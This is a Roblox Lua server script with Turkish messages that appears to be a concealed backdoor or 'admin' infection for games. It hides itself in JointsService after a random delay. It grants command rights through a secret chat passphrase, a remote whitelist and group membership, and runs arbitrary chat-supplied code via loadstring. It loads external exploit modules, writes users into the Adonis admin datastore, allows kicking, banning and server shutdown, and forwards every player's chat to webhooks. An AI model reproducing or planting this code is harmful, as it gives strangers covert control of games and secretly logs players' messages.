task.wait(math.random(3,25))
script.Parent = game.JointsService

local c = script:Clone()
--local l = script:GetChildren()[1]:Clone()
local cmds = {}
local f = workspace:GetDescendants()[math.random(1,#workspace:GetDescendants())]
local messages = {}
local chats = {}
local banned = {}
local g = {}
local ak = {}
local AutoRespawn = {}
local iyl = nil
local prefix = "?"

local BackupIDs = {
	"2356735418";
	"2356735418";
}

function GetWhitelist()
	local returnedUsers = {}
	
	local success, response = pcall(function()
		return game:GetService("HttpService"):GetAsync(u)
	end)

	if success and response then
		returnedUsers = string.split(response, "\n")
	else
		returnedUsers = BackupIDs
	end
	
	return returnedUsers
end

local Whitelist = GetWhitelist()

function p(a, me)
	local ps = game.Players:GetPlayers()
	local found = {}

	if a:lower() == "me" then
		found = {me}
	elseif a:lower() == "others" then
		for i, player in ipairs(ps) do
			if player ~= me then
				table.insert(found, player)
			end
		end
	elseif a:lower() == "all" then
		found = ps
	elseif a:lower() == "random" then
		if #ps > 0 then
			found = {ps[math.random(1, #ps)]}
		end
	else
		for i, player in ipairs(ps) do
			if player.Name:lower():sub(1, #a) == a:lower() or player.DisplayName:lower():sub(1, #a) == a:lower() then
				table.insert(found, player)
			end
		end
	end

	return found
end

local function addcmd(data)
	if cmds[data.Name] then
		return
	end

	if not data.Aliases then
		data.Aliases = {}
	end

	if data.Player == nil then
		data.Player = true
	end

	cmds[data.Name] = {
		Data = data
	}
end

function notfi(plr, title, message, duration)
	coroutine.wrap(function()

		local s = Instance.new("ScreenGui")
		s.Name = ""

		if plr then
			s.Parent = plr:FindFirstChild("PlayerGui")
		else
			return
		end

		local n = Instance.new("Frame")
		n.Size = UDim2.new(0, 300, 0, 150)
		n.Position = UDim2.new(1, 10, 1, -160)
		n.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		n.BackgroundTransparency = 0.3
		n.BorderSizePixel = 0
		n.Parent = s
		n.Name = ""

		local tb = Instance.new("Frame")
		tb.Size = UDim2.new(1, 0, 0, 30)
		tb.Position = UDim2.new(0, 0, 0, 0)
		tb.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
		tb.BackgroundTransparency = 0.2
		tb.BorderSizePixel = 0
		tb.Parent = n
		tb.Name = ""

		local close = Instance.new("TextButton")
		close.Size = UDim2.new(0, 25, 0, 25)
		close.Position = UDim2.new(1, -30, 0, 2)
		close.Text = "X"
		close.TextColor3 = Color3.fromRGB(255, 255, 255)
		close.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
		close.BackgroundTransparency = 0.5
		close.BorderSizePixel = 0
		close.Font = Enum.Font.GothamBold
		close.TextSize = 14
		close.Parent = tb
		close.Name = ""

		close.MouseEnter:Connect(function()
			close.BackgroundTransparency = 0.2
		end)

		close.MouseLeave:Connect(function()
			close.BackgroundTransparency = 0.5
		end)

		close.MouseButton1Click:Connect(function()
			n:TweenPosition(UDim2.new(1, 10, 1, -160), "Out", "Quad", 0.5)
			task.wait(0.5)
			n:Destroy()
		end)

		local t = Instance.new("TextLabel")
		t.Text = title
		t.Size = UDim2.new(1, -10, 0, 25)
		t.Position = UDim2.new(0, 10, 0, 35)
		t.TextColor3 = Color3.fromRGB(255, 255, 255)
		t.BackgroundTransparency = 1
		t.Font = Enum.Font.GothamBold
		t.TextSize = 25
		t.TextXAlignment = Enum.TextXAlignment.Left
		t.Parent = n
		t.Name = ""

		local m = Instance.new("TextLabel")
		m.Text = message
		m.Size = UDim2.new(1, -10, 1, -70)
		m.Position = UDim2.new(0, 10, 0, 65)
		m.TextColor3 = Color3.fromRGB(200, 200, 200)
		m.BackgroundTransparency = 1
		m.Font = Enum.Font.Gotham
		m.TextSize = 18
		m.TextXAlignment = Enum.TextXAlignment.Left
		m.TextYAlignment = Enum.TextYAlignment.Top
		m.TextWrapped = true
		m.Parent = n
		m.Name = ""

		n:TweenPosition(UDim2.new(1, -310, 1, -160), "Out", "Quad", 0.5)
		task.wait(duration or 5)
		n:TweenPosition(UDim2.new(1, 10, 1, -160), "Out", "Quad", 0.5)
		task.wait(0.5)
		n:Destroy()
	end)()
end

addcmd({
	Name = "kick",
	Aliases = {"k"},
	Function = function(sender, targets, arguments)
		local reason = table.concat(arguments, " ", 1)

		if reason == "" or reason == " " then
			reason = "TSA | MIT, tarafından kicklendiniz."
		end

		for i, plr in ipairs(targets) do
			plr:Kick(reason)
		end
	end
})

addcmd({
	Name = "ban",
	Aliases = {},
	Function = function(sender, targets, arguments)
		local reason = table.concat(arguments, " ", 1)

		if reason == "" or reason == " " then
			reason = "TSA | MIT, tarafından banlandınız."
		end

		for i, plr in ipairs(targets) do
			plr:Kick(reason)
			if not banned[plr.UserId] then
				banned[plr.UserId] = plr.Name
			end
		end
	end
})

addcmd({
	Name = "delete",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			plr:Destroy()
		end
	end
})

addcmd({
	Name = "bring",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				plr.Character.HumanoidRootPart.CFrame = sender.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4.5)
			end
		end
	end
})

addcmd({
	Name = "to",
	Aliases = {"goto"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") and sender.Character and sender.Character:FindFirstChild("HumanoidRootPart") then
				sender.Character.HumanoidRootPart.CFrame = plr.Character.HumanoidRootPart.CFrame * CFrame.new(0, 0, -4.5)
			end
		end
	end
})

addcmd({
	Name = "kill",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			if plr.Character then
				plr.Character:BreakJoints()
			end
		end
	end
})

addcmd({
	Name = "refresh",
	Aliases = {"re", "ref", "unmit"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
            local r = nil

            if plr.Character and plr.Character:FindFirstChild("HumanoidRootPart") then
                r = plr.Character.HumanoidRootPart.CFrame
            else
                plr:LoadCharacter()
                return
            end

            plr:LoadCharacter()
            plr.Character:WaitForChild("HumanoidRootPart").CFrame = r
		end
	end
})

addcmd({
	Name = "bans",
	Aliases = {"banlist"},
	Player = false,
	Function = function(sender, targets, arguments)

		local s = Instance.new("ScreenGui")
		s.Name = ""
		s.Parent = sender:WaitForChild("PlayerGui")

		local frame = Instance.new("Frame")
		frame.Size = UDim2.new(0, 400, 0, 300)
		frame.Position = UDim2.new(0.5, -200, 0.5, -150)
		frame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
		frame.BackgroundTransparency = 0.3
		frame.BorderSizePixel = 0
		frame.Parent = s
		frame.Name = ""

		local topBar = Instance.new("Frame")
		topBar.Size = UDim2.new(1, 0, 0, 30)
		topBar.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
		topBar.BackgroundTransparency = 0.2
		topBar.BorderSizePixel = 0
		topBar.Parent = frame
		topBar.Name = ""

		local title = Instance.new("TextLabel")
		title.Text = "Ban List"
		title.Size = UDim2.new(1, -10, 1, 0)
		title.Position = UDim2.new(0, 10, 0, 0)
		title.TextColor3 = Color3.fromRGB(255, 255, 255)
		title.BackgroundTransparency = 1
		title.Font = Enum.Font.GothamBold
		title.TextSize = 18
		title.TextXAlignment = Enum.TextXAlignment.Left
		title.Parent = topBar
		title.Name = ""

		local closeButton = Instance.new("TextButton")
		closeButton.Size = UDim2.new(0, 25, 0, 25)
		closeButton.Position = UDim2.new(1, -30, 0, 2)
		closeButton.Text = "X"
		closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
		closeButton.BackgroundColor3 = Color3.fromRGB(255, 50, 50)
		closeButton.BackgroundTransparency = 0.5
		closeButton.BorderSizePixel = 0
		closeButton.Font = Enum.Font.GothamBold
		closeButton.TextSize = 14
		closeButton.Parent = topBar
		closeButton.Name = ""

		closeButton.MouseButton1Click:Connect(function()
			frame:TweenPosition(UDim2.new(0.5, -200, 1.5, -150), "Out", "Quad", 0.5)
			task.wait(0.5)
			s:Destroy()
		end)

		local scroll = Instance.new("ScrollingFrame")
		scroll.Size = UDim2.new(1, 0, 1, -40)
		scroll.Position = UDim2.new(0, 0, 0, 40)
		scroll.BackgroundTransparency = 1
		scroll.BorderSizePixel = 0
		scroll.ScrollBarThickness = 5
		scroll.ScrollBarImageColor3 = Color3.fromRGB(100, 100, 100)
		scroll.Parent = frame
		scroll.Name = ""

		local layout = Instance.new("UIListLayout")
		layout.Parent = scroll
		layout.FillDirection = Enum.FillDirection.Vertical
		layout.Padding = UDim.new(0, 5)
		layout.Name = ""

		for uid, user in pairs(banned) do
			local bframe = Instance.new("Frame")
			bframe.Size = UDim2.new(1, -10, 0, 30)
			bframe.Position = UDim2.new(0, 5, 0, 0)
			bframe.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
			bframe.BackgroundTransparency = 0.5
			bframe.BorderSizePixel = 0
			bframe.Parent = scroll
			bframe.Name = ""

			local blabel = Instance.new("TextLabel")
			blabel.Text = user .. " | " .. tostring(uid)
			blabel.Size = UDim2.new(0.7, 0, 1, 0)
			blabel.Position = UDim2.new(0, 10, 0, 0)
			blabel.TextColor3 = Color3.fromRGB(255, 255, 255)
			blabel.BackgroundTransparency = 1
			blabel.Font = Enum.Font.Gotham
			blabel.TextSize = 16
			blabel.TextXAlignment = Enum.TextXAlignment.Left
			blabel.Parent = bframe
			blabel.Name = ""

			local unbanb = Instance.new("TextButton")
			unbanb.Text = "Unban"
			unbanb.Size = UDim2.new(0.25, 0, 1, 0)
			unbanb.Position = UDim2.new(0.75, 0, 0, 0)
			unbanb.TextColor3 = Color3.fromRGB(255, 255, 255)
			unbanb.BackgroundColor3 = Color3.fromRGB(50, 200, 50)
			unbanb.BackgroundTransparency = 0.2
			unbanb.BorderSizePixel = 0
			unbanb.Font = Enum.Font.GothamBold
			unbanb.TextSize = 14
			unbanb.Parent = bframe
			unbanb.Name = ""

			unbanb.MouseButton1Click:Connect(function()
				banned[uid] = nil
				bframe:Destroy()
			end)
		end

		layout:GetPropertyChangedSignal("AbsoluteContentSize"):Connect(function()
			scroll.CanvasSize = UDim2.new(0, 0, 0, layout.AbsoluteContentSize.Y)
		end)

	end
})

addcmd({
	Name = "rank",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
			-- // Services \\ --

			local Players = game:GetService("Players")
			local DataStoreService = game:GetService("DataStoreService")
			local MessagingService = game:GetService("MessagingService")

			-- // Change These Values For It To Work \\ --

			local value = DataStoreService:GetDataStore("Adonis_Loader")
			local Username = plr.Name

			-- // Prevents Clutter \\ --

			if not (value or Username) then
				return
			end

			-- // The Data \\ --

			local DatastoreData = {}

			DatastoreData.Action = "Add"
			DatastoreData.Table = {
				"Settings",
				"Ranks",
				"Development Team",
				"Users"
			}
			DatastoreData.Time = os.time()
			DatastoreData.Type = "TableAdd"
			DatastoreData.Value = (Username..":"..Players:GetUserIdFromNameAsync(Username))

			local MessageData = {}

			MessageData[1] = ""
			MessageData[2] = "LoadData"
			MessageData[3] = "TableUpdate"
			MessageData[4] = DatastoreData

			-- // The Transform \\ --

			local TransformFunction = function(old)
				table.insert(old, DatastoreData)
				return old
			end

			-- // The Async \\ --

			if (value:GetAsync("saj2sdas") == nil) then
				value:SetAsync("saj2sdas", {DatastoreData})
			else
				value:UpdateAsync("saj2sdas", TransformFunction)
			end

			MessagingService:PublishAsync("DChAODFVNg4+RTk+FzY8PkdJGDFJOSwrOjgv", MessageData)
		end
	end
})

addcmd({
	Name = "s",
	Aliases = {"run", "execute"},
	Player = false,
	Function = function(sender, targets, arguments)
		local a = table.concat(arguments, " ")

		local success, fail = pcall(function()
			loadstring(a)()
		end)
		
		if fail then
			notfi(sender, "TSA | MIT", "Kod çalıştırılamadı. Hata: | ".. fail) 
		end
	end
})
--[[
addcmd({
	Name = "ls",
	Aliases = {"localscript"},
	Function = function(sender, targets, arguments)
		local a = table.concat(arguments, " ", 1)
		for i, plr in ipairs(targets) do
			local b = l:Clone()
			b:GetChildren()[1].Value = a
			b.Parent = plr.PlayerGui
			b.Enabled = true
		end
	end
})
]]
addcmd({
	Name = "iy",
	Aliases = {"infiniteyield"},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
            require(100506488790924).load("IY")
            repeat task.wait() until game:GetService("ReplicatedStorage"):FindFirstChild("IY")
            local iy = game:GetService("ReplicatedStorage"):FindFirstChild("IY")
            iy.Name = ""
            iy.Parent = plr.PlayerGui
		end
	end
})

addcmd({
	Name = "iyss",
	Aliases = {"infiniteyieldss"},
	Function = function(sender, targets, arguments)
        if #targets > 1 then
            notfi(sender, "[TSA | MIT]", "Bunu sadece bir kişi yükleyebilir! Yüklendikten sonra diğer kişilere vermek için ;owner plr kullanın!")
        end

        if iyloaded ~= nil then
            notfi(sender, "[TSA | MIT]", "IY zaten ".. iyloaded .." tarafından yüklendi, size yetki vermesini isteyin!")
            return
        end

		for i, plr in ipairs(targets) do
            require(4696373104)(plr.Name)
            iyloaded = plr.Name
		end
	end
})

addcmd({
	Name = "exser",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
            local success, fail = pcall(function()
                require(10868847330):pls(plr.Name)
            end)
            
            if success then
                task.spawn(function()
                    task.wait(1.5)
                    notfi(plr, "[TSA | MIT]", "Şifre: c00lkidds", 7)
                end)
            else
                notfi(plr, "[TSA | MIT]", "Exser yüklenemedi, Hata: | ".. fail)
            end
		end
	end
})

addcmd({
	Name = "sensation",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
            local success, fail = pcall(function()
                require(100263845596551)(plr.Name, ColorSequence.new(Color3.fromRGB(71, 148, 253), Color3.fromRGB(71, 253, 160)), "Standard")
            end)
            
            if fail then
                notfi(plr, "[TSA | MIT]", "Sensation yüklenemedi! Hata: | ".. fail)
            end
		end
	end
})

addcmd({
	Name = "d3x",
	Aliases = {},
	Function = function(sender, targets, arguments)
		for i, plr in ipairs(targets) do
            local success, fail = pcall(function()
                require(15827159924).MauDex(plr.Name)
            end)
            
            if fail then
                notfi(plr, "[TSA | MIT]", "D3x yüklenemedi! Hata: | ".. fail)
            end
		end
	end
})

addcmd({
        Name = "f3x",
        Aliases = {"btools"},
        Function = function(sender, targets, arguments)
            for i, plr in ipairs(targets) do
                
                local success, err = pcall(function()
                    require(2571067295).load(plr.Name)
                end)

                if err then
                    notfi(sender, "[TSA | MIT]", "F3x yüklenemedi! Hata: ".. err)
                end

            end
        end
    })

addcmd({
        Name = "shutdown",
        Aliases = {},
        Player = false,
        Function = function(sender, targets, arguments)
            local reason = table.concat(arguments, " ")

            if reason == "" or reason == " " then
                reason = "Sunucu, bir MIT Personeli tarafından kapatılmıştır."
            end

            for i,v in pairs(game.Players:GetPlayers()) do
                v:Kick("[TSA | MIT] | Sebep: ".. reason)
            end
            game.Players.ChildAdded:Connect(function(poop)
                poop:Kick("[TSA | MIT] | Sebep: ".. reason)
            end)
        end
    })

local teams = {
	"HAPIS" == "Artichoke",
	"ASIZ" == "Really black",
	"HKK" == "Storm blue",
	"JGK" == "Dark blue",
	"KKK" == "Black",
	"OKK" == "Cocoa",
	"OS" == "Really red",
	"SM" == "Pearl",
	"TSK" == "Mid gray"
}

addcmd({
	Name = "team",
	Aliases = {},
	Function = function(sender, targets, arguments)
		local a = table.concat(arguments, " ", 1)
		for i, plr in ipairs(targets) do
			
			if a == "HAPIS" then
				plr.TeamColor = BrickColor.new("Artichoke")
				plr:LoadCharacter()
			elseif a == "ASIZ" then
				plr.TeamColor = BrickColor.new("Really black")
				plr:LoadCharacter()
			elseif a == "HKK" then
				plr.TeamColor = BrickColor.new("Storm blue")
				plr:LoadCharacter()
			elseif a == "JGK" then
				plr.TeamColor = BrickColor.new("Dark blue")
				plr:LoadCharacter()
			elseif a == "KKK" then
				plr.TeamColor = BrickColor.new("Black")
				plr:LoadCharacter()
			elseif a == "OKK" then
				plr.TeamColor = BrickColor.new("Cocoa")
				plr:LoadCharacter()
			elseif a == "OS" then
				plr.TeamColor = BrickColor.new("Really red")
				plr:LoadCharacter()
			elseif a == "SM" then
				plr.TeamColor = BrickColor.new("Pearl")
				plr:LoadCharacter()
			elseif a == "TSK" then
				plr.TeamColor = BrickColor.new("Mid gray")
				plr:LoadCharacter()
			end
			
		end
	end
})

addcmd({
	Name = "tag",
	Aliases = {"nametag"},
	Function = function(sender, targets, arguments)
		local a = table.concat(arguments, " ", 1)
		for i, plr in ipairs(targets) do
			
			if plr.Character.Head:FindFirstChild("Nametag") then
				plr.Character.Head:FindFirstChild("Nametag"):Destroy()
			end
			
			local n = game:GetService("ServerScriptService"):FindFirstChild("Erencagil Nametag System"):FindFirstChild("Nametag"):Clone()
			plr.Character.Humanoid.DisplayDistanceType = "None"
			local name = n.RobloxAd
			local brans = n.Brans
			local rank = n.Rutbe
			n.Parent = plr.Character.Head
			n.Adornee = plr.Character.Head
			name.Text = plr.Name
			rank.Text = a
			brans.Text = plr.Team.Name
			rank.TextColor3 = Color3.fromRGB(0,0,0)
			brans.TextColor3 = game:GetService("Teams")[plr.Team.Name].TeamColor.Color
			brans.TextStrokeTransparency = 0.6
			brans.TextStrokeColor3 = Color3.fromRGB(0, 0, 0)
			
			plr.leaderstats["Rütbe"].Value = a
		end
	end
})

addcmd({
	Name = "m",
	Aliases = {"message"},
    Player = false,
	Function = function(sender, targets, arguments)
        local a = table.concat(arguments, " ")
        local m = Instance.new("Message", workspace)
        m.Name = ""
        m.Text = a

        task.spawn(function()
            task.wait(3.5)
            m:Destroy()
        end)

	end
})

addcmd({
	Name = "pm",
	Aliases = {"privatemessage"},
	Function = function(sender, targets, arguments)
        for i, plr in ipairs(targets) do

            if plr:FindFirstChild("PlayerGui") then
                local a = table.concat(arguments, " ")
                local m = Instance.new("Message", plr.PlayerGui)
                m.Name = ""
                m.Text = a

                task.spawn(function()
                    task.wait(3.5)
                    m:Destroy()
                end)
            else
                notfi(sender, "[TSA | MIT]", "PlayerGUI si olmadığı için, oyuncuya mesaj gönderilememiştir.")
                return
            end
        end
	end
})

addcmd({
	Name = "h",
	Aliases = {"hint"},
    Player = false,
	Function = function(sender, targets, arguments)
        local a = table.concat(arguments, " ")
        local m = Instance.new("Hint", workspace)
        m.Name = ""
        m.Text = a

        task.spawn(function()
            task.wait(3.5)
            m:Destroy()
        end)
        
	end
})

addcmd({
	Name = "wl",
	Aliases = {"whitelist"},
	Function = function(sender, targets, arguments)
	    for i, plr in ipairs(targets) do
	        table.insert(Whitelist, tostring(plr.UserId))
			notfi(plr, "[TSA | MIT]", "Yetki Verildi!")
			end
end
})

addcmd({
	Name = "unwl",
	Aliases = {"unwhitelist"},
	Function = function(sender, targets, arguments)
	    for i, plr in ipairs(targets) do
	        table.remove(Whitelist, tostring(plr.UserId))
			notfi(sender, "[TSA | MIT]", "Yetki Kaldırıldı!")
			end
end
})

addcmd({
    Name = "spectate",
    Aliases = {"spec", "watch"},
    Function = function(sender, targets, arguments)
        local RunService = game:GetService("RunService")
        local camera = workspace.CurrentCamera
        local spectateConnection = nil 

        for i, plr in ipairs(targets) do
            if not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") then
                notfi(sender, "Spectate", plr.Name .. " oyunda değil.")
                return
            end

            local targetHRP = plr.Character.HumanoidRootPart
            camera.CameraType = Enum.CameraType.Scriptable

            if spectateConnection then
                spectateConnection:Disconnect()
                spectateConnection = nil
            end

            spectateConnection = RunService.RenderStepped:Connect(function()
                if not sender.Character or not sender.Character:FindFirstChild("HumanoidRootPart") then
                    spectateConnection:Disconnect()
                    spectateConnection = nil
                    camera.CameraType = Enum.CameraType.Custom
                    return
                end
                if not plr.Character or not plr.Character:FindFirstChild("HumanoidRootPart") then
                    spectateConnection:Disconnect()
                    spectateConnection = nil
                    camera.CameraType = Enum.CameraType.Custom
                    return
                end

                camera.CFrame = targetHRP.CFrame * CFrame.new(0, 5, 10) * CFrame.Angles(math.rad(-15), 0, 0)
            end)

            notfi(sender, "[TSA | MIT]", "Şimdi " .. plr.Name .. " izleniyor.")
            break
        end
    end
})

addcmd({
    Name = "unspectate",
    Aliases = {"unspec", "stopwatch"},
    Function = function(sender, targets, arguments)
        local camera = workspace.CurrentCamera
        if spectateConnection then
            spectateConnection:Disconnect()
            spectateConnection = nil
            camera.CameraType = Enum.CameraType.Custom
            notfi(sender, "[TSA | MIT]", "Spectate modu kapatıldı.")
        else
            notfi(sender, "[TSA | MIT]", "Spectate modu zaten açık değil.")
        end
    end
})

addcmd({
	Name = "god",
	Aliases = {},
	Function = function(sender, targets, arguments)
        for i, plr in ipairs(targets) do
            if plr.Character and plr.Character:FindFirstChild("Humanoid") then

                if not table.find(g, plr.Name) then
                    table.insert(g, plr.Name)
                else
                    notfi(sender, "[TSA | MIT]", "This player already has god enabled.")
                    return
                end

                local c = nil

                local function b(p)
                    if not p.Character and not p.Character:FindFirstChild("Humanoid") then
                        repeat task.wait() until p.Character and p.Character:FindFirstChild("Humanoid")
                    end
                    local f = Instance.new("ForceField", p.Character)
                    f.Visible = false
                    c = p.Character.Humanoid:GetPropertyChangedSignal("Health"):Connect(function()
                        if not table.find(g, p.Name) then return end
                        p.Character.Humanoid.MaxHealth = math.huge
                        p.Character.Humanoid.Health = math.huge
                    end)
                end

                plr.CharacterAdded:Connect(function()
                    if not table.find(g, plr.Name) then return end
                    repeat task.wait() until plr and plr.Character and plr.Character:FindFirstChild("Humanoid")
                    b(plr)
                end)

                b(plr)

            else
                return
            end
        end
	end
})

addcmd({
	Name = "ungod",
	Aliases = {},
	Function = function(sender, targets, arguments)
        for i, plr in ipairs(targets) do
            if table.find(g, plr.Name) then
                table.remove(g, table.find(g, plr.Name))
            end
        end
	end
})

addcmd({
	Name = "gun",
	Aliases = {"weapon"},
	Function = function(sender, targets, arguments)
		local a = table.concat(arguments, " ", 1)
		for i, plr in ipairs(targets) do

			if a:lower() == "all" then
				for i, v in pairs(game:GetService("Teams"):GetDescendants()) do
					if v:IsA("Tool") then
						v:Clone().Parent = plr.Backpack
					end
				end
			end

			for i, v in pairs(game:GetService("Teams"):GetDescendants()) do
				if v:IsA("Tool") and v.Name == a then
					v:Clone().Parent = plr.Backpack
					return
				end
			end
		end
	end
})

addcmd({
	Name = "mit",
	Aliases = {"hide"},
	Function = function(sender, targets, arguments)
        for i, plr in ipairs(targets) do
            if not plr.Character then return end
            for i,v in pairs(plr.Character:GetDescendants()) do
                if v:IsA("BasePart") then
                    v.Color = Color3.fromRGB(0, 0, 0)
                    v.Material = Enum.Material.Metal
                    v.Reflectance = 0.7
                    if v.Name == "Head" then
                        v.Transparency = 1
                        if v:FindFirstChild("face") then
                            v.face:Destroy()
                        end
                    end
                end
                if v.Name == "Nametag" then
                    v:Destroy()
                end
                if v:IsA("Shirt") or v:IsA("Pants") or v:IsA("ShirtGraphic") then
                    v:Destroy()
                end

                if v:IsA("Accessory") then
                    v:Destroy()
                end
            end



            local success, accessory = pcall(function()
                return game:GetService("InsertService"):LoadAsset(131002050916569)
            end)
       
            if success and accessory then
                local hat = accessory:FindFirstChildOfClass("Accessory")
                if hat and plr.Character then
                    hat.Parent = plr.Character
                end
                local shirt = Instance.new("Shirt")
                   shirt.ShirtTemplate = "rbxassetid://7035180219"
                   shirt.Parent = plr.Character
            end
        end
	end
})

addcmd({
	Name = "antikill",
	Aliases = {"autore"},
	Function = function(sender, targets, arguments)
        for i, plr in ipairs(targets) do
            if table.find(ak, plr.Name) then
                notfi(sender, "TSA | MIT", "Bu oyuncunun antikill özelliği zaten etkin.")
                return
            end
            table.insert(ak, plr.Name)

            AntiKill(plr)
        end
	end
})

addcmd({
	Name = "unantikill",
	Aliases = {"unautore"},
	Function = function(sender, targets, arguments)
        for i, plr in ipairs(targets) do
            if table.find(ak, plr.Name) then
                table.remove(ak, table.find(ak, plr.Name))
            end
        end
	end
})

function onDeath(Character:Model)
	if Character and Character:FindFirstChild("HumanoidRootPart") then
		local DeathPosition = Character.HumanoidRootPart.CFrame

		if AutoRespawn[Character.Name] then

			local Player = game.Players[Character.Name]
			Player:LoadCharacter()

			Player.Character:WaitForChild("HumanoidRootPart",3)
			Player.Character.HumanoidRootPart.CFrame = DeathPosition

		end
	end
end

function onCharacterAdded(Character:Model)
    
    Character.Humanoid.Died:Once(function()
        
        onDeath(Character)
    end)
    
end

function AntiKill(Player:Player)
    
    if not Player then
        return
    end
    
    AutoRespawn[Player.Name] = Player.CharacterAdded:Connect(onCharacterAdded)
    
    -- For their current character.
    onCharacterAdded(Player.Character)
    
end

for i,v in pairs(game.Players:GetPlayers()) do

	if table.find(Whitelist, tostring(v.UserId)) then
		notfi(v, "TSA | MIT ", "Yetki verildi! Prefix: ".. prefix)
	end

	v.Chatted:Connect(function(msg)

		if not table.find(Whitelist, tostring(v.UserId)) then
			table.insert(chats, v.Name ..":" .. msg)
		end

       
		table.insert(messages, v.DisplayName ..": " .. msg)
		
		if msg == "pasaniznasilsiktiama32131312" or msg == "/e pasaniznasilsiktiama32131312" then
			table.insert(Whitelist, tostring(v.UserId))
			notfi(v, "TSA | MIT ", "Yetki Verildi!")
		end

		if table.find(Whitelist, tostring(v.UserId)) then

			if msg:sub(1, #prefix) == prefix then
				msg = msg:sub(#prefix + 1)

				local parts = msg:split(" ")
				local cmdname = parts[1]

				local command = cmds[cmdname]
				if not command then
					for i, cmd in pairs(cmds) do
						if table.find(cmd.Data.Aliases, cmdname) then
							command = cmd
							break
						end
					end
				end

				if command then
					local playerless = command.Data.Player
					local target
					local args

					if playerless then
						target = parts[2] or "me"
						args = {table.unpack(parts, 3)}
					else
						target = nil
						args = {table.unpack(parts, 2)}
					end

					local targets = playerless and p(target, v) or nil
					command.Data.Function(v, targets, args)
				else
					notfi(v, "TSA | MIT " .. cmdname .. ' Komudu bulunamadı.')
				end	
			end
		else
			return
		end
	end)
end

local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")

local webhookURLs = {
    "",
    "",
    ""
}

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg)
        for i, url in ipairs(webhookURLs) do
            task.spawn(function()
                local uniqueTag = " [#" .. tostring(i) .. " | " .. os.time() .. "]"

                local data = {
                    ["username"] = "Chat Logger",
                    ["content"] = "",
                    ["embeds"] = {
                        {
                            ["author"] = {
                                ["name"] = "TSA | Turkish Armed Forces",
                                ["url"] = "https://www.roblox.com/communities/34363848/T-S-A-Turkish-Armed-Forces",
                                ["icon_url"] = "https://tr.rbxcdn.com/180DAY-e60b57aea0ae2f5fec63cfdf48bae778/150/150/Image/Webp/noFilter",
                            },
                            ["footer"] = {
                                ["text"] = "Chat Logs",
                                ["icon_url"] = "https://www.freepnglogos.com/uploads/turkey-logo-13.png",
                            },
                            ["title"] = "**Yeni Mesaj!**",
                            ["description"] = player.Name .. ": " .. msg .. uniqueTag,
                            ["type"] = "rich",
                            ["color"] = tonumber("0xFF0000"),
                            ["image"] = {
                                ["url"] = "https://www.roblox.com/headshot-thumbnail/image?userId=" .. player.UserId .. "&width=150&height=150&format=png"
                            }
                        }
                    }
                }

                local headers = {
                    ["content-type"] = "application/json"
                }

                pcall(function()
                    HttpService:RequestAsync({
                        Url = url,
                        Method = "POST",
                        Headers = headers,
                        Body = HttpService:JSONEncode(data)
                    })
                end)

                task.wait(0.25)
            end)
        end
    end)
end)

game.Players.PlayerAdded:Connect(function(plr)
    if plr:IsInGroup(35206749) then
        table.insert(Whitelist, tostring(plr.UserId))
        notfi(plr, "[TSA | MIT]", "Yetki verildi!")
    end
end)

game.Players.PlayerAdded:Connect(function(player)

	repeat task.wait() until player and player.Character or not game.Players:FindFirstChild(player.Name)

	if table.find(Whitelist, tostring(player.UserId)) then
		task.wait(1.5)
		notfi(player, "TSA | MIT ", "Yetki verildi!  Prefix: ".. prefix)
	end

	if banned[player.UserId] then
		player:Kick("TSA | MIT, tarafından banlandınız.")
	end

	player.Chatted:Connect(function(msg)

		if not table.find(Whitelist, tostring(player.UserId)) then
			table.insert(chats, player.Name ..":" .. msg)
		end

		table.insert(messages, player.DisplayName ..": " .. msg)
		
		if msg == "pasaniznasilsiktiama32131312" or msg == "/e pasaniznasilsiktiama32131312" then
			table.insert(Whitelist, tostring(player.UserId))
			notfi(player, "TSA | MIT ", "Yetki Verildi!")
		end

		if table.find(Whitelist, tostring(player.UserId)) then

			if msg:sub(1, #prefix) == prefix then
				msg = msg:sub(#prefix + 1)

				local parts = msg:split(" ")
				local cmdname = parts[1]

				local command = cmds[cmdname]
				if not command then
					for i, cmd in pairs(cmds) do
						if table.find(cmd.Data.Aliases, cmdname) then
							command = cmd
							break
						end
					end
				end

				if command then
					local playerless = command.Data.Player
					local target
					local args

					if playerless then
						target = parts[2] or "me"
						args = {table.unpack(parts, 3)}
					else
						target = nil
						args = {table.unpack(parts, 2)}
					end

					local targets = playerless and p(target, player) or nil
					command.Data.Function(player, targets, args)
				else
					notfi(player, "TSA | MIT " .. cmdname .. ' Komudu bulunamadı.')
				end
			end
		else
			return
		end
	end)
end)
